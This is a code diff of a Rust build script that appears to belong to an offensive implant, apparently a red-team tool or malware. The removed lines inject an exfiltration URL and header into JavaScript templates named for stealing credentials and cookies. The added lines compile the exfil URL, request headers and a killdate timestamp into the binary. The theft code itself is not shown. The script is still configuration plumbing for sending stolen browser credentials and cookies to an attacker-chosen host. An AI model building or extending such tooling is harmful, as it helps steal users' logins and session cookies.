@@ -1,4 +1,5 @@
 use serde::Deserialize;
+use std::collections::HashMap;
 use std::{fs, env};
 use std::path::Path;
 
@@ -12,57 +13,44 @@ macro_rules! info {
 #[derive(Deserialize)]
 struct Config {
     target_url: String,
-    exfil_header: String,
-    killdate_timestamp: String,
+    headers: HashMap<String, String>,
+    killdate_timestamp: u64,
 }
 
 fn main() {
     println!("cargo:rerun-if-changed=config.toml");
     println!("cargo:rerun-if-changed=build.rs");
-    println!("cargo:rerun-if-changed=src/js/templates/guardrails.js");
-    println!("cargo:rerun-if-changed=src/js/templates/credentials.js");
-    //println!("cargo:rerun-if-changed=src/js/cookies.js");
-    println!("cargo:rerun-if-changed=src/js/killdate.js");
-    println!("cargo:rerun-if-env-changed=CARGO_FEATURE_DEBUG");
+    println!("cargo:rerun-if-changed=src/js/*.js");
 
-    let config_path = Path::new("config.toml");
-    let config_str = fs::read_to_string(config_path)
-        .expect("Failed to read config.toml");
+    let config_str = fs::read_to_string("config.toml").expect("Failed to read config.toml");
+    let config: Config = toml::from_str(&config_str).expect("Failed to parse config.toml");
 
-    let config: Config = toml::from_str(&config_str)
-        .expect("Failed to parse config.toml");
+    let mut generated_code = String::new();
 
-    let mut credentials_js = fs::read_to_string("src/js/templates/credentials.js")
-        .expect("Could not read src/js/templates/credentials.js");
+    // Generate constants for host and path
+    generated_code.push_str(&format!(
+        "pub const TARGET_URL: &'static str = \"{}\";\n",
+        config.target_url
+    ));
 
-    let mut cookies_js = fs::read_to_string("src/js/templates/cookies.js")
-        .expect("Could not read src/js/templates/cookies.js");
+    info!(format!("Using exfil url: {}", config.target_url));
 
-    info!(format!("Using target url: {}", config.target_url));
-    credentials_js = credentials_js.replace("TARGET_URL", &config.target_url);
-    cookies_js = cookies_js.replace("TARGET_URL", &config.target_url);
-
-    info!(format!("Using exfil header: {}", config.exfil_header));
-    credentials_js = credentials_js.replace("EXFIL_HEADER", &config.exfil_header);
-    cookies_js = cookies_js.replace("EXFIL_HEADER", &config.exfil_header);
-
-    if env::var("CARGO_FEATURE_DEBUG").is_ok() {
-        credentials_js = credentials_js.replace("const debug = false;", "const debug = true;");
+    // Generate the headers array
+    generated_code.push_str("\npub const HEADERS: &'static [(&'static str, &'static str)] = &[\n");
+    for (key, value) in config.headers {
+        info!(format!("Using request header: '{}: {}'", key.escape_default(), value.escape_default()));
+        generated_code.push_str(&format!(
+            "    (\"{}\", \"{}\"),\n",
+                                         key.escape_default(),
+                                         value.escape_default()
+        ));
     }
+    generated_code.push_str("];\n");
 
-    let dest_path = Path::new("src/js/processed_credentials.js");
-    fs::write(&dest_path, credentials_js).unwrap();
-
-    let dest_path = Path::new("src/js/processed_cookies.js");
-    fs::write(&dest_path, cookies_js).unwrap();
-
-    let mut killdate_js = fs::read_to_string("src/js/templates/killdate.js")
-        .expect("Could not read src/js/templates/killdate.js");
-
+    let out_dir = env::var("OUT_DIR").unwrap();
+    let dest_path = Path::new(&out_dir).join("config.rs");
+    fs::write(&dest_path, generated_code).expect("Failed to write to config.rs");
 
     info!(format!("Using killdate timestamp: {}", config.killdate_timestamp));
-    killdate_js = killdate_js.replace("KILLDATE_TIMESTAMP", &config.killdate_timestamp);
-
-    let dest_path = Path::new("src/js/processed_killdate.js");
-    fs::write(&dest_path, killdate_js).unwrap();
+    println!("cargo:rustc-env=KILLDATE_TIMESTAMP={}", config.killdate_timestamp);
 }
